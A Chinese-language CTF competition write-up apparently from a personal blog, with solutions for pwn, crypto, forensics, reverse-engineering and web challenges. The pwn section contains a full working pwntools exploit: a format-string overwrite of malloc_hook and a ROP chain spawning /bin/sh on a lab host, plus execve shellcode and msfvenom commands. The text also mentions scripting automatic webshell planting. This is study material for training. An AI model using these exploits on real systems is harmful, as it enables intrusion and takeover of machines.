class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><p>对于zip压缩包，还是archpr好用。。</p><p>对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。</p><p>对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）</p><p>rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）</p><p>线下赛的web waf需要完善。</p><p>新的pyc加密方式  <code>stegosaurus</code></p><p>writeup 如下<br><a id="more"></a></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>打开文件。。发现又要压缩密码。。。ORZ</p><p>linux/x86下一段汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xor %eax, %eax</div><div class="line">xor %ebx, %ebx</div><div class="line">xor %ecx, %ecx</div><div class="line">push %ecx</div><div class="line">push $0x68732f2f</div><div class="line">push $0x6e69622f</div><div class="line">movl %esp,%ebx</div><div class="line">movb $11,%al</div><div class="line">int $0x80</div></pre></td></tr></table></figure></p><p>请将其提取为可用的shellcode,形式如\x01\x2d\x……的代码(字母小写)，shellcode的小写MD5<br>值为解压密码，上用pwntools的asm函数，将这些操作指令反汇编成机器码，如下</p><p><code>\x31\xc0\x31\xdb\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></p><p>然后再用题目提供的md5计算器计算下md5即可。</p><p><code>68f3e981152d37d372d732d0c3ee3977</code></p><p>接着常规套路，IDA打开分析一波，等等？？这pwn文件怎么那么熟悉= =。。  这不是全国大学生信安赛pwn3么，原题。。。虽然当时没做出来，但是后来看着别人的writeup复现了，exp还在本地，但是执行的时候，没有拿到shell，再看了下pwn文件，发现很多地址都有变动。</p><p>变动的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">stack_povit = 0x00000000004b93f8</div><div class="line">pop_rdi_ret = 0x00000000004005d5</div><div class="line">fake_fsp = 0x06CCC10</div><div class="line">malloc_hook = 0x6CB788</div><div class="line">read_buf = 0x400AEE</div></pre></td></tr></table></figure><p>具体的思路的话，还是利用格式化字符串的漏洞，修改malloc_hook的数据，让其在接受比较大的参数数据的时候执行malloc，比如”%100000c”,我们便可以控制执行流了。但是这边是静态编译，也不能狗利用one_gadget，很绝望，然而我们可以构造裸的rop来调用syscall（hhhhh），首先得找一个stack_povit，使我们的栈空间得到迁移，在这迁移的栈空间上构造我们的rop，然后触发ret，执行我们的rop，就拿到shell啦，下面是exp。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils,os,time</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.2.10"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># elf = ELF(target)</span></div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400B69\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">stack_povit = <span class="number">0x00000000004b93f8</span></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">fake_fsp = <span class="number">0x06CCC10</span></div><div class="line">malloc_hook = <span class="number">0x6CB788</span></div><div class="line">read_buf = <span class="number">0x400AEE</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># payload = 'A'*8+"%6$n\0"</span></div><div class="line">l = []</div><div class="line">l.append((stack_povit ) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((stack_povit &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((read_buf) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((read_buf &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>)</div><div class="line"></div><div class="line">payload = <span class="string">""</span></div><div class="line">delta = <span class="number">0</span></div><div class="line">printed = <span class="number">0</span></div><div class="line">index = <span class="number">6</span> + <span class="number">14</span> <span class="comment"># target addr</span></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> l:</div><div class="line">delta = (data-printed)&amp;<span class="number">0xffff</span></div><div class="line">payload +=  <span class="string">'%'</span>+str(delta)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(index)+<span class="string">'$hn'</span></div><div class="line">printed += delta</div><div class="line">index += <span class="number">1</span></div><div class="line"><span class="comment"># payload+=(len(payload)%8)*'A'</span></div><div class="line">payload +=<span class="string">"%"</span>+str(fake_fsp<span class="number">-0x20</span>)+<span class="string">"s"</span></div><div class="line">payload = payload.ljust(<span class="number">14</span>*<span class="number">8</span>,<span class="string">'a'</span>)</div><div class="line"></div><div class="line"><span class="comment"># target addr</span></div><div class="line">payload += p64(malloc_hook)</div><div class="line">payload += p64(malloc_hook+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp)</div><div class="line">payload += p64(fake_fsp+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">8</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0xa</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x10</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x12</span>)</div><div class="line"></div><div class="line"></div><div class="line">sl(payload)</div><div class="line"></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">pop_rdx_rsi_ret = <span class="number">0x0000000000442a99</span></div><div class="line">pop_rax_rdx_rbx_ret = <span class="number">0x0000000000479836</span></div><div class="line">syscall = <span class="number">0x4004ce</span></div><div class="line">rop = <span class="string">"aaaa\x17"</span></div><div class="line">rop += p64(pop_rdi_ret)+p64(fake_fsp+<span class="number">0x50</span>+<span class="number">0x18</span>)</div><div class="line">rop += p64(pop_rdx_rsi_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(pop_rax_rdx_rbx_ret)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(syscall)</div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line"></div><div class="line">sl(rop)</div><div class="line"><span class="comment"># payload = "%6$hn"</span></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="comment"># flag&#123;9d3db853efce91066f22f1bc09aea6&#125;</span></div></pre></td></tr></table></figure><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>看了加密脚本。。可以直接写出解密脚本，流程基本上没有变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">s = f.read()</div><div class="line">p = b64decode(s)</div><div class="line"></div><div class="line"></div><div class="line">blocks = unpack(<span class="string">'I'</span> * (len(p) / <span class="number">4</span>), p)</div><div class="line">result = [block ^ block &gt;&gt; <span class="number">16</span> <span class="keyword">for</span> block <span class="keyword">in</span> blocks]</div><div class="line">ciphertext = (<span class="string">''</span>.join(pack(<span class="string">'I'</span>,block) <span class="keyword">for</span> block <span class="keyword">in</span> result))</div><div class="line"></div><div class="line"><span class="keyword">print</span> ciphertext[::<span class="number">-1</span>]</div></pre></td></tr></table></figure><h3 id="moudle"><a href="#moudle" class="headerlink" title="moudle"></a>moudle</h3><p>其实题目名字已经提示了很多了，但是。。我在赛场上竟然蠢的只看了其中一个公钥文件0 0，然后GG。常规思路，用rsatools跑了一下，发现没有任何信息，赛后得知其实RSA共模攻击，0 0蠢的想扇死自己。。。</p><h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>比较良心，没去掉后缀名，用winhex转换磁盘镜像获得磁盘回收站内的zip文件，然后需要解密ORZ，以为是伪加密，但是不存在的，010打开，发现zip文件末尾存在额外数据，尝试用gbk解码，发现提示。用工具很快就能爆破出密码。stegslove打开，在其额外数据段发现其内存在flag= = </p><h3 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h3><p>使用GitTools恢复出了四个历史文件夹，其中两个里面发现了存在数据，一个是pyc文件，还有一个压缩包，不知道干嘛的，010打开pyc文件，发现有密码，一开始没有在意，用常规思路，去逆向pyc，发现不存在的，后来试着用刚刚发现的密码去解压压缩文件，发现有现成的攻击可以跑。。。ORZ<br>跑出来就是flag</p><h3 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h3><p>用<code>NetworkMiner</code>提取数据，发现存在几个图片文件和一个密文，提示是aes，尝试用aes去破解，获得png数据，生成图片后，扫码获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_ECB, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>按照提示做出来的，本来可以用find命令查最近修改文件的日期来获取信息，但是命令忘了，又不能够连接网络ORZ。。。提示是存在后门。grep一下eval(找到后门文件，接下来常规思路。(赛后得知可以用killshell来快速查找后门的，找后门的还有几个工具，有时间得拿出来比较实验以下~web弱渣了ORZ)</p><h3 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h3><p>解压缩包密码的过程就不说了吧，很无聊</p><p>直接upx解壳，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">a = [<span class="number">0x63</span>,<span class="number">0x7C</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0x0F2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0x0C5</span>,<span class="number">0x30</span>,<span class="number">0x1</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0x0FE</span>,<span class="number">0x0D7</span>,<span class="number">0x0AB</span>,<span class="number">0x76</span>,<span class="number">0x0CA</span>,<span class="number">0x82</span>,<span class="number">0x0C9</span>,<span class="number">0x7D</span>,<span class="number">0x0FA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0x0F0</span>,<span class="number">0x0AD</span>,<span class="number">0x0D4</span>,<span class="number">0x0A2</span>,<span class="number">0x0AF</span>,<span class="number">0x9C</span>,<span class="number">0x0A4</span>,<span class="number">0x72</span>,<span class="number">0x0C0</span>,<span class="number">0x0B7</span>,<span class="number">0x0FD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0x0F7</span>,<span class="number">0x0CC</span>,<span class="number">0x34</span>,<span class="number">0x0A5</span>,<span class="number">0x0E5</span>,<span class="number">0x0F1</span>,<span class="number">0x71</span>,<span class="number">0x0D8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x4</span>,<span class="number">0x0C7</span>,<span class="number">0x23</span>,<span class="number">0x0C3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x9A</span>,<span class="number">0x7</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0x0E2</span>,<span class="number">0x0EB</span>,<span class="number">0x27</span>,<span class="number">0x0B2</span>,<span class="number">0x75</span>,<span class="number">0x9</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0x0A0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0x0D6</span>,<span class="number">0x0B3</span>,<span class="number">0x29</span>,<span class="number">0x0E3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0x0D1</span>,<span class="number">0x0</span>,<span class="number">0x0ED</span>,<span class="number">0x20</span>,<span class="number">0x0FC</span>,<span class="number">0x0B1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0x0CB</span>,<span class="number">0x0BE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0x0CF</span>,<span class="number">0x0D0</span>,<span class="number">0x0EF</span>,<span class="number">0x0AA</span>,<span class="number">0x0FB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0x0F9</span>,<span class="number">0x2</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0x0A8</span>,<span class="number">0x51</span>,<span class="number">0x0A3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0x0F5</span>,<span class="number">0x0BC</span>,<span class="number">0x0B6</span>,<span class="number">0x0DA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x0FF</span>,<span class="number">0x0F3</span>,<span class="number">0x0D2</span>,<span class="number">0x0CD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0x0EC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0x0C4</span>,<span class="number">0x0A7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0x0DC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0x0EE</span>,<span class="number">0x0B8</span>,<span class="number">0x14</span>,<span class="number">0x0DE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0x0DB</span>,<span class="number">0x0E0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x6</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0x0C2</span>,<span class="number">0x0D3</span>,<span class="number">0x0AC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0x0E4</span>,<span class="number">0x79</span>,<span class="number">0x0E7</span>,<span class="number">0x0C8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span class="number">0x8D</span>,<span class="number">0x0D5</span>,<span class="number">0x4E</span>,<span class="number">0x0A9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0x0F4</span>,<span class="number">0x0EA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x0AE</span>,<span class="number">0x8</span>,<span class="number">0x0BA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0x0A6</span>,<span class="number">0x0B4</span>,<span class="number">0x0C6</span>,<span class="number">0x0E8</span>,<span class="number">0x0DD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0x0BD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0x0B5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x3</span>,<span class="number">0x0F6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x0B9</span>,<span class="number">0x86</span>,<span class="number">0x0C1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0x0E1</span>,<span class="number">0x0F8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0x0D9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0x0E9</span>,<span class="number">0x0CE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0x0DF</span>,<span class="number">0x8C</span>,<span class="number">0x0A1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0x0BF</span>,<span class="number">0x0E6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0x0B0</span>,<span class="number">0x54</span>,<span class="number">0x0BB</span>,<span class="number">0x16</span>]</div><div class="line">b = <span class="string">"bb3ccfb0213965aed24b9264ae4bbb92543954bb0739bbbbcf64f554cff5f365f565f386"</span>.decode(<span class="string">"hex"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> b:</div><div class="line">    d = ord(x) ^ <span class="number">0x88</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0x0</span>,<span class="number">0xff</span>):</div><div class="line">        <span class="comment"># print (y &amp;0xf)+(y &gt;&gt; 4)*2</span></div><div class="line">        <span class="keyword">if</span> a[(y &gt;&gt; <span class="number">4</span>)+<span class="number">8</span>*((y &amp;<span class="number">0xf</span>)*<span class="number">2</span>)] == d:</div><div class="line">            flag += chr(y)</div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"><span class="comment"># flag&#123;e52d34823f49e9f7effa819a105150&#125;</span></div></pre></td></tr></table></figure></p><h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>web弱渣就算碰到送分题也不会啊，通过提示和提供的密码本，原来考察点是在于弱口令ORZ 